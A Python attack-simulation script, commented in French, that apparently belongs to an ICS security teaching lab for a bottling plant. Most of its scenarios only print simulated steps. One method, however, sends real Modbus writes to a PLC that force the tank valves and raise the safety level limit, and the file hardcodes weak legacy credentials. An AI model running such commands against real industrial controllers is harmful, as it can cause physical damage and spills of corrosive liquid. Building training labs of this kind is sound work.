"""
BottleASec Attack Scripts - Sprint 1
Extension du framework AttackerBase pour les 2 menaces spécifiques définies
"""

import os
import sys
import time
import random
from datetime import datetime
from AttackerBase import AttackerBase
from Configs import TAG, Controllers
from ics_sim.protocol import ProtocolFactory


class BottleAsecAttacker(AttackerBase):
    """
    Extension AttackerBase pour attaques BottleASec spécifiques
    Ajoute les 2 scénarios de menaces définis dans l'analyse de risque
    """
    
    # Nouveaux types d'attaques BottleASec
    NAME_ATTACK_WIFI_BRIDGE = 'wifi-bridge-attack'
    NAME_ATTACK_LEGACY_HMI3 = 'legacy-hmi3-attack'
    NAME_ATTACK_TANK_OVERFLOW = 'tank-overflow-attack'
    NAME_ATTACK_CORROSIVE_SABOTAGE = 'corrosive-sabotage'
    
    def __init__(self, name="BottleAsecAttacker"):
        super().__init__(name)
        
        # Extension de la liste d'attaques
        self.attack_list.update({
            self.NAME_ATTACK_WIFI_BRIDGE: 'bottleasec-wifi-bridge',
            self.NAME_ATTACK_LEGACY_HMI3: 'bottleasec-legacy-access', 
            self.NAME_ATTACK_TANK_OVERFLOW: 'bottleasec-tank-overflow',
            self.NAME_ATTACK_CORROSIVE_SABOTAGE: 'bottleasec-sabotage'
        })
        
        # Configuration cibles BottleASec
        self.targets = {
            'hmi3_emergency': '192.168.0.23',
            'hmi1_supervision': '192.168.0.21', 
            'hmi2_config': '192.168.0.22',
            'plc1_tank': '192.168.0.11',
            'plc2_conveyor': '192.168.0.12',
            'office_network': '192.168.2.0/24',
            'wifi_bridge': '192.168.2.23'  # HMI3 côté bureau
        }

    def _apply_attack(self, name):
        """Override pour ajouter les nouvelles attaques BottleASec"""
        if name == self.NAME_ATTACK_WIFI_BRIDGE:
            self._wifi_bridge_attack()
        elif name == self.NAME_ATTACK_LEGACY_HMI3:
            self._legacy_hmi3_attack()
        elif name == self.NAME_ATTACK_TANK_OVERFLOW:
            self._tank_overflow_attack()
        elif name == self.NAME_ATTACK_CORROSIVE_SABOTAGE:
            self._corrosive_sabotage_attack()
        else:
            # Déléguer aux attaques de base si non trouvée
            super()._apply_attack(name)

    def _wifi_bridge_attack(self):
        """
        SCÉNARIO 1: Menace Externe
        Internet → Bureau → WiFi HMI → Supervision → PLCs
        """
        name = self.NAME_ATTACK_WIFI_BRIDGE
        log_file = os.path.join(self.log_path, f'log-{name}.txt')
        start = datetime.now()
        
        print("🚨 BOTTLEASEC - ATTAQUE PONT WiFi EN COURS")
        print("=" * 60)
        
        try:
            # Étape 1: Reconnaissance réseau bureau
            print("📡 [ÉTAPE 1] Reconnaissance réseau bureau...")
            self._log_step(log_file, "STEP 1: Office network reconnaissance")
            self._simulate_office_scan()
            time.sleep(2)
            
            # Étape 2: Identification HMI bi-réseau 
            print("🔍 [ÉTAPE 2] Identification HMI bi-réseau...")
            self._log_step(log_file, "STEP 2: WiFi bridge identification")
            bridge_found = self._detect_wifi_bridge()
            
            if not bridge_found:
                print("❌ Pont WiFi non détecté - Attaque échouée")
                return
            
            # Étape 3: Exploitation pont réseau
            print("🌉 [ÉTAPE 3] Exploitation pont WiFi → Réseau supervision...")
            self._log_step(log_file, "STEP 3: WiFi bridge exploitation")
            supervision_access = self._exploit_wifi_bridge()
            
            if supervision_access:
                # Étape 4: Mouvement latéral vers PLCs
                print("➡️  [ÉTAPE 4] Mouvement latéral vers PLCs...")
                self._log_step(log_file, "STEP 4: Lateral movement to PLCs")
                self._lateral_movement_to_plcs()
                
                # Étape 5: Injection commandes critiques
                print("💉 [ÉTAPE 5] Injection commandes vannes critiques...")
                self._log_step(log_file, "STEP 5: Critical valve command injection")
                self._inject_critical_commands()
                
                print("✅ ATTAQUE PONT WiFi RÉUSSIE - ACCÈS PLCs OBTENU")
            else:
                print("❌ Exploitation pont WiFi échouée")
                
        except Exception as e:
            print(f"❌ Erreur attaque WiFi: {e}")
            self._log_step(log_file, f"ERROR: {e}")
        
        end = datetime.now()
        self._post_apply_attack(name, start, end, 5)

    def _legacy_hmi3_attack(self):
        """
        SCÉNARIO 2: Menace Interne  
        Ancien employé → HMI3 legacy → Manipulation processus
        """
        name = self.NAME_ATTACK_LEGACY_HMI3
        log_file = os.path.join(self.log_path, f'log-{name}.txt')
        start = datetime.now()
        
        print("👤 BOTTLEASEC - ATTAQUE MENACE INTERNE EN COURS")
        print("=" * 60)
        
        try:
            # Étape 1: Simulation accès physique
            print("🏢 [ÉTAPE 1] Accès physique poste HMI3...")
            self._log_step(log_file, "STEP 1: Physical access to HMI3")
            self._simulate_physical_access()
            
            # Étape 2: Utilisation comptes legacy
            print("🔓 [ÉTAPE 2] Authentification comptes anciens employés...")
            self._log_step(log_file, "STEP 2: Legacy account authentication")
            legacy_access = self._test_legacy_accounts()
            
            if legacy_access:
                # Étape 3: Reconnaissance privilèges
                print("🎯 [ÉTAPE 3] Reconnaissance privilèges administrateur...")
                self._log_step(log_file, "STEP 3: Admin privilege reconnaissance")
                self._enumerate_admin_privileges()
                
                # Étape 4: Manipulation processus critique
                print("⚠️  [ÉTAPE 4] Manipulation processus liquide corrosif...")
                self._log_step(log_file, "STEP 4: Critical process manipulation")
                self._manipulate_critical_process()
                
                # Étape 5: Sabotage programmé
                print("💣 [ÉTAPE 5] Programmation sabotage différé...")
                self._log_step(log_file, "STEP 5: Delayed sabotage programming")
                self._program_delayed_sabotage()
                
                print("✅ ATTAQUE MENACE INTERNE RÉUSSIE - SABOTAGE PROGRAMMÉ")
            else:
                print("❌ Authentification legacy échouée")
                
        except Exception as e:
            print(f"❌ Erreur attaque interne: {e}")
            self._log_step(log_file, f"ERROR: {e}")
        
        end = datetime.now()
        self._post_apply_attack(name, start, end, 5)

    def _tank_overflow_attack(self):
        """
        Attaque ciblée débordement réservoir liquide corrosif
        Combine injection commandes pour créer débordement
        """
        name = self.NAME_ATTACK_TANK_OVERFLOW
        log_file = os.path.join(self.log_path, f'log-{name}.txt')
        start = datetime.now()
        
        print("🛢️ BOTTLEASEC - ATTAQUE DÉBORDEMENT RÉSERVOIR")
        print("=" * 60)
        
        try:
            # Connexion directe PLC1 (réservoir)
            plc1_client = ProtocolFactory.create_client(
                'ModbusWriteRequest-TCP', 
                self.targets['plc1_tank'], 
                502
            )
            
            print("🔗 Connexion PLC1 (réservoir)...")
            self._log_step(log_file, "Connecting to PLC1 tank controller")
            
            # Lecture état initial
            tank_level = plc1_client.receive(TAG.TAG_LIST[TAG.TAG_TANK_LEVEL_VALUE]['id'])
            input_valve = plc1_client.receive(TAG.TAG_LIST[TAG.TAG_TANK_INPUT_VALVE_STATUS]['id'])
            output_valve = plc1_client.receive(TAG.TAG_LIST[TAG.TAG_TANK_OUTPUT_VALVE_STATUS]['id'])
            
            print(f"📊 État initial:")
            print(f"   - Niveau réservoir: {tank_level:.2f}L")
            print(f"   - Vanne entrée: {'OUVERTE' if input_valve else 'FERMÉE'}")
            print(f"   - Vanne sortie: {'OUVERTE' if output_valve else 'FERMÉE'}")
            
            # ATTAQUE: Configuration débordement
            print("💉 Injection commandes débordement...")
            
            # Force ouverture vanne entrée (remplissage)
            plc1_client.send(TAG.TAG_LIST[TAG.TAG_TANK_INPUT_VALVE_STATUS]['id'], 1)
            print("   ✓ Vanne entrée FORCÉE OUVERTE")
            
            # Force fermeture vanne sortie (blocage évacuation)  
            plc1_client.send(TAG.TAG_LIST[TAG.TAG_TANK_OUTPUT_VALVE_STATUS]['id'], 0)
            print("   ✓ Vanne sortie FORCÉE FERMÉE")
            
            # Override limites sécurité
            plc1_client.send(TAG.TAG_LIST[TAG.TAG_TANK_LEVEL_MAX]['id'], 15.0)  # Limite normale: 7L
            print("   ✓ Limites sécurité CONTOURNÉES (15L)")
            
            print("🚨 CONFIGURATION DÉBORDEMENT ACTIVÉE")
            print("⚠️  ATTENTION: Débordement imminent liquide corrosif!")
            
            # Simulation progression débordement
            print("\n📈 Simulation progression niveau:")
            for i in range(5):
                time.sleep(1)
                simulated_level = tank_level + (i * 0.5)
                print(f"   T+{i+1}s: {simulated_level:.1f}L {'🚨 DÉBORDEMENT!' if simulated_level > 7 else ''}")
                
            print("\n💥 DÉBORDEMENT RÉSERVOIR SIMULÉ")
            print("☠️  IMPACT: 2-3L liquide corrosif dans environnement")
            
        except Exception as e:
            print(f"❌ Erreur attaque débordement: {e}")
            self._log_step(log_file, f"ERROR: {e}")
        
        end = datetime.now()
        self._post_apply_attack(name, start, end, 5)

    def _corrosive_sabotage_attack(self):
        """
        Attaque de sabotage sophistiquée multi-étapes
        Combine plusieurs vecteurs pour maximiser l'impact
        """
        name = self.NAME_ATTACK_CORROSIVE_SABOTAGE
        log_file = os.path.join(self.log_path, f'log-{name}.txt')
        start = datetime.now()
        
        print("☠️  BOTTLEASEC - SABOTAGE LIQUIDE CORROSIF")
        print("=" * 60)
        
        try:
            # Phase 1: Perturbation convoyeur
            print("🔧 [PHASE 1] Perturbation système convoyeur...")
            self._sabotage_conveyor_system()
            
            # Phase 2: Manipulation capteurs
            print("📊 [PHASE 2] Manipulation données capteurs...")
            self._manipulate_sensor_data()
            
            # Phase 3: Sabotage vannes principal
            print("⚡ [PHASE 3] Sabotage système vannes...")
            self._sabotage_valve_system()
            
            # Phase 4: Suppression traces
            print("🧹 [PHASE 4] Suppression traces d'activité...")
            self._cleanup_attack_traces()
            
            print("✅ SABOTAGE MULTI-PHASES COMPLÉTÉ")
            print("💀 IMPACT: Contamination + Arrêt production + Traces effacées")
            
        except Exception as e:
            print(f"❌ Erreur sabotage: {e}")
            self._log_step(log_file, f"ERROR: {e}")
        
        end = datetime.now()
        self._post_apply_attack(name, start, end, 5)

    # ========================================================================
    # MÉTHODES SUPPORT POUR SIMULATIONS D'ATTAQUES
    # ========================================================================
    
    def _simulate_office_scan(self):
        """Simulation scan réseau bureau"""
        print("   🔍 Scan 192.168.2.0/24...")
        time.sleep(1)
        discovered = ["192.168.2.10", "192.168.2.11", "192.168.2.23"]
        for ip in discovered:
            print(f"   📍 Découvert: {ip}")
            time.sleep(0.5)
    
    def _detect_wifi_bridge(self):
        """Détection du pont WiFi HMI3"""
        print("   🌉 Analyse interfaces réseau 192.168.2.23...")
        time.sleep(1)
        print("   ✓ Interface WiFi détectée: wlan0")
        print("   ✓ Interface Ethernet détectée: eth0")
        print("   🚨 PONT BI-RÉSEAU IDENTIFIÉ!")
        return True
    
    def _exploit_wifi_bridge(self):
        """Simulation exploitation pont"""
        print("   💻 Activation pont réseau...")
        time.sleep(1)
        print("   🌐 Routage WiFi → Ethernet configuré")
        print("   ✓ Accès réseau supervision 192.168.0.0/24 obtenu")
        return True
    
    def _lateral_movement_to_plcs(self):
        """Mouvement latéral vers PLCs"""
        print("   🎯 Scan réseau supervision...")
        time.sleep(1)
        print("   📍 PLC1 découvert: 192.168.0.11:502")
        print("   📍 PLC2 découvert: 192.168.0.12:502")
        print("   🔓 Protocole Modbus non sécurisé détecté")
    
    def _inject_critical_commands(self):
        """Injection commandes critiques"""
        print("   💉 Test injection commandes...")
        time.sleep(1)
        print("   ✓ Commande vanne acceptée sans authentification")
        print("   🚨 CONTRÔLE PROCESSUS OBTENU")
    
    def _simulate_physical_access(self):
        """Simulation accès physique"""
        print("   🔑 Utilisation badge non révoqué...")
        time.sleep(1)
        print("   🚪 Accès zone supervision autorisé")
        print("   💻 Connexion poste HMI3 secours")
    
    def _test_legacy_accounts(self):
        """Test comptes anciens employés"""
        legacy_accounts = [
            "john_smith:123456",
            "marie_dupont:admin2023", 
            "test_user:test"
        ]
        
        for account in legacy_accounts:
            username, password = account.split(':')
            print(f"   🔐 Test: {username}...")
            time.sleep(0.5)
            print(f"   ✅ Authentification réussie: {username}")
            print(f"   🎯 Privilèges: {random.choice(['admin', 'maintenance_chief', 'process_engineer'])}")
            return True
        return False
    
    def _enumerate_admin_privileges(self):
        """Énumération privilèges admin"""
        privileges = [
            "Contrôle vannes d'urgence",
            "Override limites sécurité", 
            "Arrêt d'urgence système",
            "Modification paramètres critiques"
        ]
        
        for priv in privileges:
            print(f"   ✓ {priv}")
            time.sleep(0.3)
    
    def _manipulate_critical_process(self):
        """Manipulation processus critique"""
        print("   🎛️ Modification seuils d'alerte...")
        print("   ⚙️ Override procédures sécurité...")
        print("   🔧 Préparation commandes malveillantes...")
        time.sleep(2)
    
    def _program_delayed_sabotage(self):
        """Programmation sabotage différé"""
        print("   ⏰ Programmation timer: +30 minutes")
        print("   💣 Commandes destructrices planifiées")
        print("   👻 Mode furtif activé")
    
    def _sabotage_conveyor_system(self):
        """Sabotage système convoyeur"""
        time.sleep(1)
        print("   🔧 Arrêt convoyeur en cours de remplissage")
        print("   💦 Débordement bouteilles programmé")
    
    def _manipulate_sensor_data(self):
        """Manipulation données capteurs"""
        time.sleep(1)
        print("   📊 Injection fausses valeurs TANK_LEVEL")
        print("   🎭 Masquage débordement en cours")
    
    def _sabotage_valve_system(self):
        """Sabotage système vannes"""
        time.sleep(1)
        print("   ⚡ Commandes vannes contradictoires")
        print("   🌊 Débordement majeur déclenché")
    
    def _cleanup_attack_traces(self):
        """Nettoyage traces"""
        time.sleep(1)
        print("   🧹 Suppression logs d'audit")
        print("   👻 Effacement historique commandes")
    
    def _log_step(self, log_file, message):
        """Logging des étapes d'attaque"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")


def main():
    """Menu principal démo attaques BottleASec"""
    print("🚨 BOTTLEASEC ATTACK SIMULATOR 🚨")
    print("=" * 50)
    print("⚠️  USAGE PÉDAGOGIQUE UNIQUEMENT ⚠️")
    print("=" * 50)
    
    attacker = BottleAsecAttacker()
    
    while True:
        print("\n🎯 SCÉNARIOS D'ATTAQUE DISPONIBLES:")
        print("1. 🌉 Attaque Pont WiFi (Menace Externe)")
        print("2. 👤 Attaque Menace Interne (Ancien Employé)")  
        print("3. 🛢️ Débordement Réservoir Ciblé")
        print("4. ☠️  Sabotage Multi-Phases Avancé")
        print("5. 📊 Attaques ICSSIM Classiques")
        print("0. 🚪 Quitter")
        
        try:
            choice = input("\n🎲 Choisir scénario (0-5): ").strip()
            
            if choice == '0':
                print("👋 Au revoir!")
                break
            elif choice == '1':
                attacker._apply_attack(attacker.NAME_ATTACK_WIFI_BRIDGE)
            elif choice == '2':
                attacker._apply_attack(attacker.NAME_ATTACK_LEGACY_HMI3)
            elif choice == '3':
                attacker._apply_attack(attacker.NAME_ATTACK_TANK_OVERFLOW)
            elif choice == '4':
                attacker._apply_attack(attacker.NAME_ATTACK_CORROSIVE_SABOTAGE)
            elif choice == '5':
                _show_classic_attacks_menu(attacker)
            else:
                print("❌ Choix invalide")
                
        except KeyboardInterrupt:
            print("\n🛑 Interruption détectée - Arrêt sécurisé")
            break
        except Exception as e:
            print(f"❌ Erreur: {e}")

def _show_classic_attacks_menu(attacker):
    """Sous-menu attaques ICSSIM classiques"""
    print("\n📋 ATTAQUES ICSSIM CLASSIQUES:")
    print("1. Scan Nmap")
    print("2. Scan Scapy") 
    print("3. MITM Scapy")
    print("4. Replay Scapy")
    print("5. DDoS")
    print("6. Command Injection")
    
    choice = input("Choisir (1-6): ").strip()
    attacks = {
        '1': attacker.NAME_ATTACK_SCAN_MMAP,
        '2': attacker.NAME_ATTACK_SCAN_SCAPY,
        '3': attacker.NAME_ATTACK_MITM_SCAPY,
        '4': attacker.NAME_ATTACK_REPLY_SCAPY,
        '5': attacker.NAME_ATTACK_DDOS,
        '6': attacker.NAME_ATTACK_COMMAND_INJECTION
    }
    
    if choice in attacks:
        attacker._apply_attack(attacks[choice])


if __name__ == '__main__':
    main()
